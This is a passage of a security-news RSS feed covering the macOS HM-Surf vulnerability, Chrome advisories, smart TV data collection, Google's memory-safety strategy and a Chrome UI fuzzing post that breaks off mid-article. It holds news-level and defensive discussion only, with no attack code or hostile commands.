for them to gain access to these services is by approving a popup through their user interface, or if they approve per-app access via the settings in their operating system. 

This vulnerability, known as HM-Surf, may allow attackers to bypass key security features on macOS systems, which gives them a chance to gain access to sensitive data through the use of malicious code. It is possible that users who are not authorized to exploit the flaw could exploit macOS' own security functions, such as the sandboxing mechanisms and restrictions on file access.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">HM-Surf exploit is a vulnerability that allows attackers to gain enhanced privileges, which allows them to access sensitive data and files that would otherwise require a login and password.

Initial warnings were raised about this vulnerability because it played a role in adware campaigns, where malicious actors used this loophole to install unwanted software on users' devices in order to profit from the vulnerability. There are, however, a lot more dangers than just adware; though, it is only the beginning. If the same vulnerability were weaponized, then it might even be used for more serious attacks, such as data exfiltration, surveillance, or even as a gateway to further malware infiltration in the near future.

There is probably no doubt that HM-Surf's unique ability to bypass Apple's robust security architecture is one of the most troubling aspects of this malware.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Security

macOS is widely regarded as a secure platform, but the recent discovery of the HM-Surf vulnerability shows that even advanced systems are not immune to evolving cyber threats. This finding serves as a crucial reminder for users and organizations to prioritize cybersecurity and adopt proactive measures to protect their digital environments.

Microsoft's cybersecurity team uncovered HM-Surf, an exploit posing a serious risk to macOS. Their investigation revealed a program altering Google Chrome settings to grant unauthorized microphone and camera access while collecting user and device data.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">These actions suggested preparations for a second-stage payload that could further compromise the device.

The culprit was identified as the well-known macOS adware "AdLoad." This malware hijacks browser traffic, inundates users with ads, harvests data, and transforms infected devices into botnet nodes for further malicious activity. Although Microsoft's findings aligned with HM-Surf techniques, the researchers could not conclusively link AdLoad to actively exploiting the vulnerability.&nbsp;</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">Nevertheless, they warned that "attackers using a similar method to deploy a prevalent threat" underscored the need for enhanced protection.

The HM-Surf vulnerability illustrates the risks associated with macOS, highlighting that no operating system is invulnerable to sophisticated attacks. Exploiting such weaknesses could lead to severe consequences, including financial losses, reputational damage, and the exposure of sensitive data. The evolving nature of these threats suggests that attackers are continuously refining their methods to bypass security measures.</div><div style="text-align: justify;"><br /></div><div style="text-align: justify;">To address these challenges, organizations must adopt a multi-layered approach to cybersecurity. This includes regular system updates, comprehensive monitoring, and user education on safe practices. Deploying advanced threat detection and real-time monitoring can help detect and mitigate attacks before they cause significant harm. Regular security assessments can also identify and address potential vulnerabilities.

In summary, the emergence of the HM-Surf vulnerability is a stark reminder of the dynamic landscape of cybersecurity threats. For macOS users and businesses, this discovery emphasizes the need to act swiftly in strengthening defenses and protecting digital assets against evolving risks.</div>
]]></content:encoded>
<pubDate>2024-10-21T14:30:00.219-04:00</pubDate>
</item>
<item>
<title>Anti-Bot Services Help Cybercrooks Bypass Google 'Red Page'</title>
<link>https://www.darkreading.com/threat-intelligence/anti-bot-services-cybercrooks-bypass-google-red-page</link>
<guid>https://www.darkreading.com/threat-intelligence/anti-bot-services-cybercrooks-bypass-google-red-page</guid>
<content:encoded><![CDATA[
The emergence of novel anti-detection kits for sale on the Dark Web limit the effectiveness of a Chrome browser feature that warns users that they have reached a phishing page.
]]></content:encoded>
<pubDate>Mon, 21 Oct 2024 15:21:59 GMT</pubDate>
</item>
<item>
<title>Multiple Vulnerabilities in Google Chrome Could Allow for Arbitrary Code Execution</title>
<link>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-118</link>
<guid>https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-google-chrome-could-allow-for-arbitrary-code-execution_2024-118</guid>
<content:encoded><![CDATA[
<p>Multiple vulnerabilities have been discovered in Google Chrome, the most severe of which could allow for <span style="color: black;">arbitrary </span>code execution. <span style="color: black;">Successful exploitation of the most severe of these vulnerabilities</span> could allow for <span style="color: black;">arbitrary </span>code execution in the context of the logged on user. Depending on the privileges associated with the user an attacker could then install programs; view, change, or delete data; or create new accounts with full user rights. Users whose accounts are configured to have fewer user rights on the system could be less impacted than those who operate with administrative user rights.</p>
]]></content:encoded>
<pubDate>Tue, 15 Oct 2024 21:43:05 -0400</pubDate>
</item>
<item>
<title>Here's How to Stop Smart TV From Harvesting Your Personal Data</title>
<link>https://www.cysecurity.news/2024/10/heres-how-to-stop-smart-tv-from.html</link>
<guid>https://www.cysecurity.news/2024/10/heres-how-to-stop-smart-tv-from.html</guid>
<content:encoded><![CDATA[
<p>&nbsp;</p><div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBqLRNxlc1NS28S-qSIQyVmVkF_G3vQzmbeaATmnCWKKahqz5u6Cyd5jYwFxbh_KQ5KDFA6dcQ79eTdbPf_9SLlsaJuCEdL3sA9ghrI4nE62kKi2WYeDI-9vsc5VyPShgDgRFTjaG_fzdDp4B5bPHo0QcXd6fe4EvGYsS5qe5_Up3XuFxSsqH6tuZyIr0/s4576/1248.jpg" style="display: block; padding: 1em 0px; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgBqLRNxlc1NS28S-qSIQyVmVkF_G3vQzmbeaATmnCWKKahqz5u6Cyd5jYwFxbh_KQ5KDFA6dcQ79eTdbPf_9SLlsaJuCEdL3sA9ghrI4nE62kKi2WYeDI-9vsc5VyPShgDgRFTjaG_fzdDp4B5bPHo0QcXd6fe4EvGYsS5qe5_Up3XuFxSsqH6tuZyIr0/s600/1248.jpg" width="600" /></a></div><span style="font-family: inherit;"><div style="text-align: justify;"><span style="font-family: inherit;">Watching television seems to be a benign pastime, but as all TVs become "smart" and link to the internet via your network, they will be able to track you as well. When you turn on a smart TV from LG, Samsung, or Sony, data is collected from the TV itself, as well as the operating system and apps. Then there are the gadgets you connect to your television, like Google's Chromecast, Apple TV, and Amazon's Fire Stick.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">A TV is now more than just a screen for entertainment; it's a two-way mirror that lets a network of data brokers and advertisers watch you in real time, stated Rowenna Fielding, director of data protection consultancy Miss IG Geek. “The purpose of this is to gather as much information as possible about your behaviour, interests, preferences and demographics so it can be monetised, mainly through targeted advertising.”</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Your smart TV's data collection relies on the manufacturer, brand, and version. In theory, most smart TVs can gather audio, video, and TV usage data, according to Toby Lewis, global head of threat analysis at cybersecurity firm Darktrace.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Voice activation is a function that has the ability to collect significant volumes of data. Microphones and software listen for instructions and can record conversations and other noises within range. These recordings can be sent to third parties for analysis.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><b>What does your TV do with the data?</b></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">There is no clear answer. According to Lewis, what is done with the data is complex and "highly opaque". When looking at what a smart TV does on the network, it is often unclear why certain data is being harvested and where it is being sent.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">There isn't much distinction between television brands. Manufacturers claim to utilise your information for "personalisation" and content quality, although it is usual to sell anonymous or semi-anonymized data to third parties, advertising companies, or streaming services.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">“After the data has been sold, it is out of the manufacturer’s control,” Lewis explains. "It is often unclear what data exactly is being sent back, depending on the T&amp;Cs and privacy settings, and it can be very difficult to change default settings once you have agreed to them.”</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><b>What is Automatic Content Recognition (ACR)?&nbsp;</b></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Automated content recognition (ACR) is one alarming feature to keep an eye out for. This feature, which is frequently enabled by default, uses analytical techniques to detect video and audio on the TV and compares it to a large database to determine what is playing. It's fairly disturbing stuff; ACR works on anything played on television, including DVDs, Blu-rays, CDs, and games.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Jake Moore, global cybersecurity adviser at security company ESET, explains that viewing data and habits are shared with manufacturers and eventually sold to advertisers in order to target you with adverts. When your TV is connected to your home router, data will include your IP address and position.</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Lewis adds that ACR may theoretically be utilised for even more ominous profiling. "Data from facial recognition, sentiment analysis, speech-to-text, and content analysis could be gathered to build an in-depth picture of an individual user with the analytical technologies available."&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Lewis suggests that rather than comparing material to a catalogue of well-known films, ACR may theoretically be examined for factors like political stance, ethnicity, social status, and other characteristics that could be misused.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><b>Safety tips&nbsp;</b></span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">Smart TVs will gather data as long as they are connected to the internet, and it is impossible to prevent this from happening. In many cases, doing so is not in your best interests because it will interfere with your viewing experience; for example, Netflix's useful suggestions tool.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">However, there are several simple steps you may take to protect yourself from smart TV snooping. Turn off ACR in the settings, disable customisation, opt out of all advertising features, and hide or disable cameras and microphones.&nbsp;</span></div><div style="text-align: justify;"><span style="font-family: inherit;"><br /></span></div><div style="text-align: justify;"><span style="font-family: inherit;">It's also vital to secure your router by changing the password and creating a guest network. You may increase security by opting out of online tracking when it's provided and installing software updates as soon as possible.</span></div></span>
]]></content:encoded>
<pubDate>2024-10-16T11:07:22.898-04:00</pubDate>
</item>
<item>
<title>Safer with Google: Advancing Memory Safety</title>
<link>http://security.googleblog.com/2024/10/safer-with-google-advancing-memory.html</link>
<guid>http://security.googleblog.com/2024/10/safer-with-google-advancing-memory.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Alex Rebert, Security Foundations, and Chandler Carruth, Jen Engel, Andy Qin, Core Developers</span>

<p>
Error-prone interactions between software and memory<sup id="fnref1"><a href="#fn1" rel="footnote">1</a></sup> are <a href="http://phrack.org/archives/issues/49/14.txt">widely understood</a> to create safety issues in software. It is estimated that about 70% of severe vulnerabilities<sup id="fnref2"><a href="#fn2" rel="footnote">2</a></sup> in memory-unsafe codebases are due to memory safety bugs. Malicious actors exploit these vulnerabilities and continue to create real-world harm. In 2023, Google’s threat intelligence teams conducted an industry-wide study and observed a <a href="https://storage.googleapis.com/gweb-uniblog-publish-prod/documents/Year_in_Review_of_ZeroDays.pdf">close to all-time high number of vulnerabilities exploited in the wild</a>. Our internal analysis estimates that 75% of CVEs used in <a href="https://googleprojectzero.blogspot.com/p/0day.html">zero-day exploits</a> are memory safety vulnerabilities.
</p>
<p>
At Google, we have been mindful of these issues for over two decades, and are on a journey to continue advancing the state of memory safety in the software we consume and produce. Our <a href="https://blog.google/technology/safety-security/tackling-cybersecurity-vulnerabilities-through-secure-by-design/">Secure by Design</a> commitment emphasizes integrating security considerations, including robust memory safety practices, throughout the entire software development lifecycle. This proactive approach fosters a safer and more trustworthy digital environment for everyone.
</p>
<p>
This post builds upon our previously reported <a href="https://research.google/pubs/secure-by-design-googles-perspective-on-memory-safety/">Perspective on Memory Safety</a>, and introduces our strategic approach to memory safety. 
</p>
<p>
<strong>Our journey so far</strong>
</p>
<p>
Google's journey with memory safety is deeply intertwined with the evolution of the software industry itself. In our early days, we recognized the importance of balancing performance with safety. This led to the early adoption of memory-safe languages like Java and Python, and the creation of Go.  Today these languages comprise a large portion of our code, providing memory safety among other benefits. Meanwhile, the rest of our code is predominantly written in C++, previously the optimal choice for high-performance demands.
</p>
<p>
We recognized the inherent risks associated with memory-unsafe languages and developed tools like <a href="https://en.wikipedia.org/wiki/Code_sanitizer">sanitizers</a>, which detect memory safety bugs dynamically, and fuzzers like <a href="https://github.com/google/AFL">AFL</a> and <a href="https://releases.llvm.org/8.0.0/docs/LibFuzzer.html">libfuzzer</a>, which proactively test the robustness and security of a software application by repeatedly feeding unexpected inputs. By open-sourcing these tools, we've empowered developers worldwide to reduce the likelihood of memory safety vulnerabilities in C and C++ codebases. Taking this commitment a step further, we provide continuous fuzzing to open-source projects through <a href="https://security.googleblog.com/2016/12/announcing-oss-fuzz-continuous-fuzzing.html">OSS-Fuzz</a>, which helped get over <a href="https://security.googleblog.com/2023/02/taking-next-step-oss-fuzz-in-2023.html">8800 vulnerabilities identified and subsequently fixed across 850 projects</a>.
</p>
<p>
Today, with the emergence of high-performance memory-safe languages like Rust, coupled with a deeper understanding of the limitations of purely detection-based approaches, we are focused primarily on preventing the introduction of security vulnerabilities at scale.
</p>
<p>
<strong>Going forward: Google's two-pronged approach</strong>
</p>
<p>
Google's long-term strategy for tackling memory safety challenges is multifaceted, recognizing the need to address both existing codebases and future development, while maintaining the pace of business.
</p>
<p>
Our long-term objective is to progressively and consistently integrate memory-safe languages into Google's codebases while phasing out memory-unsafe code in new development. Given the amount of C++ code we use, we anticipate a residual amount of mature and stable memory-unsafe code will remain for the foreseeable future.
</p> <div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSRbsz3UFa32nAEek2cEOIN-IM5XN6df3vibnuP7nmzJoYLMAfkHgjlAcbCbjGmV0THU_CMtP9vgs3EHHe7zwRqeuXbQoxA_EGrqDMLDRJShnakXuMxesVqDJaq2xPWcpyqCcRpvW3-ZWJiZu2LXtyEs23CvI4jOBkw89T1iSVWHl-j4OYMsC0EN0E4dFh/s3355/memory%20safety%20graphic.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiSRbsz3UFa32nAEek2cEOIN-IM5XN6df3vibnuP7nmzJoYLMAfkHgjlAcbCbjGmV0THU_CMtP9vgs3EHHe7zwRqeuXbQoxA_EGrqDMLDRJShnakXuMxesVqDJaq2xPWcpyqCcRpvW3-ZWJiZu2LXtyEs23CvI4jOBkw89T1iSVWHl-j4OYMsC0EN0E4dFh/s600/memory%20safety%20graphic.png" width="600" /></a></div>
<p style="text-align: center;">
<em>Graphic of memory-safe language growth as memory-unsafe code is hardened and gradually decreased over time.</em>
</p>
<p>
<strong>Migration to Memory-Safe Languages (MSLs)</strong>
</p>
<p>
The first pillar of our strategy is centered on further increasing the adoption of memory-safe languages. These languages drastically drive down the risk of memory-related errors through features like garbage collection and borrow checking, embodying the same Safe Coding<sup id="fnref3"><a href="#fn3" rel="footnote">3</a></sup> principles that successfully eliminated other vulnerability classes like cross-site scripting (XSS) at scale. Google has already embraced MSLs like Java, Kotlin, Go, and Python for a large portion of our code. 
</p>
<p>
Our next target is to ramp up memory-safe languages with the necessary capabilities to address the needs of even more of our low-level environments where C++ has remained dominant. For example, we are investing to expand Rust usage at Google beyond Android and other mobile use cases and into our server, application, and embedded ecosystems. This will unlock the use of MSLs in low-level code environments where C and C++ have typically been the language of choice. In addition, we are exploring more seamless interoperability with C++ through <a href="https://github.com/carbon-language/carbon-lang">Carbon</a>, as a means to accelerate even more of our transition to MSLs.  
</p>
<p>
In Android, which runs on billions of devices and is one of our most critical platforms, we've already made strides in adopting MSLs, including Rust, in sections of our network, firmware and graphics stacks. We specifically focused on adopting memory safety in <em>new code</em> instead of rewriting mature and stable memory-unsafe C or C++ codebases. As we've previously <a href="https://security.googleblog.com/2024/09/eliminating-memory-safety-vulnerabilities-Android.html">discussed</a>, this strategy is driven by vulnerability trends as memory safety vulnerabilities were typically introduced shortly before being discovered.
</p>
<p>
As a result, the number of memory safety vulnerabilities reported in Android has decreased dramatically and quickly, dropping from more than 220 in 2019 to a projected 36 by the end of this year, demonstrating the effectiveness of this strategic shift. Given that memory-safety vulnerabilities are particularly severe, the reduction in memory safety vulnerabilities is leading to a <a href="https://security.googleblog.com/2022/12/memory-safe-languages-in-android-13.html#:~:text=With%20the%20drop%20in%20memory%20safety%20vulnerabilities%2C%20we%E2%80%99re%20seeing%20a%20corresponding%20drop%20in%20vulnerability%20severity.">corresponding drop in vulnerability severity</a>, representing a reduction in security risk. 
</p>
<p>
<strong>Risk Reduction for Memory-Unsafe Code </strong>
</p>
<p>
While transitioning to memory-safe languages is the long-term strategy, and one that requires investment now, we recognize the immediate responsibility we have to protect the safety of our billions of users during this process. This means we cannot ignore the reality of a large codebase written in memory-unsafe languages (MULs) like C and C++.
</p>
<p>
Therefore the second pillar of our strategy focuses on risk reduction & containment of this portion of our codebase. This incorporates:
</p>
<ul>

<li><strong>C++ Hardening:</strong> We are retrofitting safety at scale in our memory-unsafe code, based on our <a href="https://bughunters.google.com/blog/5896512897417216/a-recipe-for-scaling-security">experience eliminating web vulnerabilities</a>. While we won't make C and C++ memory safe, we are eliminating sub-classes of vulnerabilities in the code we own, as well as reducing the risks of the remaining vulnerabilities through exploit mitigations.
<p>

    We have allocated a portion of our computing resources specifically to <a href="https://libcxx.llvm.org/Hardening.html">bounds-checking the C++ standard library</a> across our workloads. While bounds-checking overhead is small for individual applications, deploying it at Google's scale requires significant computing resources. This underscores our deep commitment to enhancing the safety and security of our products and services. Early results are promising, and we'll share more details in a future post.
</p>
<p>

    In Chrome, we have also been rolling out <a href="https://security.googleblog.com/2024/01/miracleptr-protecting-users-from-use.html">MiraclePtr</a> over the past few years, which effectively mitigated 57% of use-after-free vulnerabilities in privileged processes, and has been <a href="https://blog.google/technology/safety-security/a-review-of-zero-day-in-the-wild-exploits-in-2023/">linked</a> to a decrease of in-the-wild exploits.
</p></li>

<li><strong>Security Boundaries: </strong>We are continuing<sup id="fnref4"><a href="#fn4" rel="footnote">4</a></sup> to strengthen critical components of our software infrastructure through expanded use of<a href="https://www.chromium.org/Home/chromium-security/site-isolation/"> isolation techniques</a> like sandboxing and privilege reduction, limiting the potential impact of vulnerabilities. For example, earlier this year, we shipped the beta release of our <a href="https://v8.dev/blog/sandbox">V8 heap sandbox</a> and included it in <a href="https://bughunters.google.com/about/rules/chrome-friends/5745167867576320/chrome-vulnerability-reward-program-rules#v8-sandbox-bypass-rewards">Chrome's Vulnerability Reward Program</a>.<br /></li>

<li><strong>Bug Detection</strong>: We are investing in bug detection tooling and innovative research such as <a href="https://googleprojectzero.blogspot.com/2024/06/project-naptime.html">Naptime</a> and making ML-guided fuzzing as effortless and wide-spread as testing. While we are increasingly shifting towards memory safety by design, these tools and techniques remain a critical component of proactively identifying and reducing risks, especially against vulnerability classes currently lacking strong preventative controls.
<p>
In addition, we are actively working with the semiconductor and research communities on emerging hardware-based approaches to improve memory safety. This includes our work to <a href="https://source.android.com/docs/security/test/memory-safety/arm-mte">support</a> and <a href="https://googleprojectzero.blogspot.com/2023/08/summary-mte-as-implemented.html">validate the efficacy</a> of <a href="https://community.arm.com/arm-community-blogs/b/architectures-and-processors-blog/posts/enhancing-memory-safety">Memory Tagging Extension</a> (MTE). Device implementations are starting to roll out, including within Google’s corporate environment. We are also conducting ongoing research into <a href="https://www.cl.cam.ac.uk/research/security/ctsrd/cheri/">Capability Hardware Enhanced RISC Instructions (CHERI)</a> architecture which can provide finer grained memory protections and safety controls, particularly appealing in security-critical environments like embedded systems.
</p>
<p>
<strong>Looking ahead</strong>
</p>
<p>
We believe it’s important to embrace the opportunity to achieve memory safety at scale, and that it will have a positive impact on the safety of the broader digital ecosystem. This path forward requires continuous investment and innovation to drive safety and velocity, and we remain committed to the broader community to walk this path together.
</p>
<p>
We will provide future publications on memory safety that will go deeper into specific aspects of our strategy. 
</p>

<!-- Footnotes themselves at the bottom. -->

<h2>Notes</h2>
<div class="footnotes">
<hr />
<ol><li id="fn1">
<p>
     Anderson, J. <em>Computer Security Technology Planning Study Vol II.</em> ESD-TR-73-51, Vol. II, Electronic Systems Division, Air Force Systems Command, Hanscom Field, Bedford, MA 01730 (Oct. 1972).  
<p>
    <a href="https://seclab.cs.ucdavis.edu/projects/history/papers/ande72.pdf">https://seclab.cs.ucdavis.edu/projects/history/papers/ande72.pdf</a> &nbsp;<a href="#fnref1" rev="footnote">&#8617;</a><li id="fn2">
<p>
     <a href="https://www.memorysafety.org/docs/memory-safety/#how-common-are-memory-safety-vulnerabilities">https://www.memorysafety.org/docs/memory-safety/#how-common-are-memory-safety-vulnerabilities</a> &nbsp;<a href="#fnref2" rev="footnote">&#8617;</a><li id="fn3">
<p>
     Kern, C. 2024. <em>Developer Ecosystems for Software Safety</em>. Commun. ACM 67, 6 (June 2024), 52–60. <a href="https://doi.org/10.1145/3651621">https://doi.org/10.1145/3651621</a>&nbsp;<a href="#fnref3" rev="footnote">&#8617;</a><li id="fn4">

<p>
     Barth, Adam, et al. “The security architecture of the chromium browser." Technical report. Stanford University, 2008.
<p>
    <a href="https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf">https://seclab.stanford.edu/websec/chromium/chromium-security-architecture.pdf</a>&nbsp;<a href="#fnref4" rev="footnote">&#8617;</a>

</ol></div>
]]></content:encoded>
<pubDate>2024-10-15T13:44:17.528-04:00</pubDate>
</item>
<item>
<title>Using Chrome's accessibility APIs to find security bugs</title>
<link>http://security.googleblog.com/2024/10/using-chromes-accessibility-apis-to.html</link>
<guid>http://security.googleblog.com/2024/10/using-chromes-accessibility-apis-to.html</guid>
<content:encoded><![CDATA[
<span class="byline-author">Posted by Adrian Taylor, Security Engineer, Chrome</span>




    


<p>
</p>
<p>
</p>
      
<p>
Chrome’s user interface (UI) code is complex, and sometimes has bugs. 
</p>
<p>
Are those bugs security bugs? Specifically, if a user’s clicks and actions result in memory corruption, is that something that an attacker can exploit to harm that user?
</p>
<p>
Our <a href="https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md">security severity guidelines</a> say “yes, sometimes.” For example, an attacker could very likely convince a user to click an autofill prompt, but it will be much harder to convince the user to step through a whole flow of different dialogs.
</p>
<p>
Even if these bugs aren’t the <em>most</em> easily exploitable, it takes a great deal of time for our security shepherds to make these determinations. User interface bugs are often flakey (that is, not reliably reproducible). Also, even if these bugs aren’t necessarily deemed to be exploitable, they may still be annoying crashes which bother the user.
</p>
<p>
It would be great if we could find these bugs automatically.
</p>
<p>
If only the whole tree of Chrome UI controls were exposed, somehow, such that we could enumerate and interact with each UI control automatically.
</p>
<p>
Aha! Chrome exposes all the UI controls to assistive technology. Chrome goes to great lengths to ensure its entire UI is exposed to screen readers, braille devices and other such assistive tech. This tree of controls includes all the toolbars, menus, and the <a href="https://developer.chrome.com/blog/full-accessibility-tree">structure of the page itself</a>. This structural definition of the browser user interface is already sometimes used in other contexts, for example by some password managers, demonstrating that investing in accessibility has <a href="https://en.wikipedia.org/wiki/Curb_cut_effect">benefits for all users</a>. We’re now taking that investment and leveraging it to find security bugs, too. 
</p>
<p>
Specifically, we’re now “fuzzing” that accessibility tree - that is, interacting with the different UI controls semi-randomly to see if we can make things crash. This technique has a <a href="https://folklore.org/Monkey_Lives.html?sort=date?sort=date">long pedigree</a>.
</p>
<p>
Screen reader technology is a bit different on each platform, but on Linux the tree can be explored using <a href="https://help.gnome.org/users/accerciser/stable/introduction.html.en">Accerciser</a>.
</p>
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1khLwvGCcYXCQyAu_uoySj2l91vrsHL3c3ijAHLy0IxhQugeivScGtpFZfvF6NU6ZgLxPCpMZBJFZFv4dDLVoE5c6eiX0TeaRlA3o6Y4gCrvbcetw9LOuixctJWtPiRgZOnqXwjuZ29z9TjYmCUVEAse1nDozxeX8iAdnZzc0pW6R33yXr8aJ1JQCAajR/s1600/image1.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1khLwvGCcYXCQyAu_uoySj2l91vrsHL3c3ijAHLy0IxhQugeivScGtpFZfvF6NU6ZgLxPCpMZBJFZFv4dDLVoE5c6eiX0TeaRlA3o6Y4gCrvbcetw9LOuixctJWtPiRgZOnqXwjuZ29z9TjYmCUVEAse1nDozxeX8iAdnZzc0pW6R33yXr8aJ1JQCAajR/s1600/image1.png" /></a></div>
<p>
<center><em>Screenshot of Accerciser showing the tree of UI controls in Chrome</em></center>
</p>
<p>
All we have to do is explore the same tree of controls with a fuzzer. How hard can it be?
</p>
<p>

    <em>“We do this not because it is easy, but because we thought it would be easy” - Anon.</em>
</p>
<p>
Actually we never thought this would be easy, and a few different bits of tech have had to fall into place to make this possible. Specifically,
</p>
<ul>

<li>There are lots of combinations of ways to interact with Chrome. Truly randomly clicking on UI controls probably won’t find bugs - we would like to leverage <a href="https://google.github.io/clusterfuzz/reference/coverage-guided-vs-blackbox/#coverage-guided-fuzzing">coverage-guided fuzzing</a> to help the fuzzer select combinations of controls that seem to reach into new code within Chrome.

<li>We need any such bugs to be genuine. We therefore need to fuzz the actual Chrome UI, or something very similar, rather than exercising parts of the code in an unrealistic unit-test-like context. That’s where our <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/test/fuzzing/in_process_fuzzer.h">InProcessFuzzer</a> framework comes into play - it runs fuzz cases within a Chrome browser_test; essentially a real version of Chrome.

<li>But such browser_tests have a high startup cost. We need to amortize that cost over thousands of test cases by running a batch of them within each browser invocation. <a href="https://github.com/google/fuzztest/tree/main/centipede">Centipede</a> is designed to do that.

<li>But each test case won’t be idempotent. Within a given invocation of the browser, the UI state may be successively modified by each test case. We intend to add <a href="https://issues.chromium.org/issues/344606392">concatenation</a> to centipede to resolve this.

<li>Chrome is a noisy environment with lots of timers, which may well confuse coverage-guided fuzzers. Gathering coverage for such a large binary is slow in itself. So, we don’t know if coverage-guided fuzzing will successfully explore the UI paths here.
</li>
</li></li></li></li></ul>
<p>
All of these concerns are common to the other fuzzers which run in the browser_test context, most notably our <a href="https://source.chromium.org/chromium/chromium/src/+/main:chrome/test/fuzzing/renderer_fuzzing/renderer_in_process_mojolpm_fuzzer.cc">new IPC fuzzer</a> (blog posts to follow). But the UI fuzzer presented some specific challenges.
</p>
<p>
Finding UI bugs is only useful if they’re actionable. Ideally, that means:
</p>
<ul>

<li>Our fuzzing infrastructure gives a thorough set of diagnostics.

<li>It can bisect to find when the bug was introduced and when it was fixed.

<li>It can minimize complex test cases into the smallest possible reproducer.

<li>The test case is descriptive and says which UI controls were used, so a human may be able to reproduce it.
</li>
</li></li></li></ul>
<p>
These requirements together mean that the test cases should be stable across each Chrome version - if a given test case reproduces a bug with Chrome 125, hopefully it will do so in Chrome 124 and Chrome 126 (assuming the bug is present in both). Yet this is tricky, since Chrome UI controls are deeply nested and often anonymous.
</p>
<p>
Initially, the fuzzer picked controls simply based on their ordinal at each level of the tree (for instance “control 3 nested in control 5 nested in control 0”) but such test cases are unlikely to be stable as the Chrome UI evolves. Instead, we settled on an approach where the controls are named, when possible, and otherwise identified by a combination of role and ordinal. This yields test cases like this:
</p>
<div class="code">
action {
  path_to_control {
    named {
      name: "Test - Chromium"
    }
  }
  path_to_control {
    anonymous {
      role: "panel"
    }
  }
  path_to_control {
    anonymous {
      role: "panel"
    }
  }
  path_to_control {
    anonymous {
      role: "panel"
    }
  }
  path_to_control {
    named {
      name: "Bookmarks"
    }
  }
  take_action {
    action_id: 12
  }
}
</div>  
<p>
Fuzzers are unlikely to stumble across these control names by chance, even with the instrumentation applied to string comparisons. In fact, this by-name approach turned out to be only 20% as effective as picking controls by ordinal. To resolve this we added a custom mutator which is smart enough to put in place control names and roles which are known to exist. We randomly use this mutator or the standard libprotobuf-mutator in order to get the best of both worlds. This approach has proven to be about 80% as quick as the original ordinal-based mutator, while providing stable test cases.
</p>
<div class="separator" style="clear: both;"><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikryEL6TdqAfO4CPD026MmtuA1mv7Vo17czluiVu1sC0nNbhnUCIPRC1QAPPG06YLVnDOV799l_uPPGWF2ljZhen-qqsRDmF2eU7Ww15EXaUquI-qFIaDgp77jprgkJ-_CJrJC05bCJOIfiBa5KWvHTb4WRLmmBZHzNz8DxVPkR_EBdMZKUv1mfM7TgKfN/s1600/image2.png" style="display: block; padding: 1em 0; text-align: center;"><img alt="" border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEikryEL6TdqAfO4CPD026MmtuA1mv7Vo17czluiVu1sC0nNbhnUCIPRC1QAPPG06YLVnDOV799l_uPPGWF2ljZhen-qqsRDmF2eU7Ww15EXaUquI-qFIaDgp77jprgkJ-_CJrJC05bCJOIfiBa5KWvHTb4WRLmmBZHzNz8DxVPkR_EBdMZKUv1mfM7TgKfN/s1600/image2.png" /></a></div>
<p>
<center><em>Chart of code coverage achieved by minutes fuzzing with different strategies</em></center>
<p>
So, does any of this work?
</p>
<p>
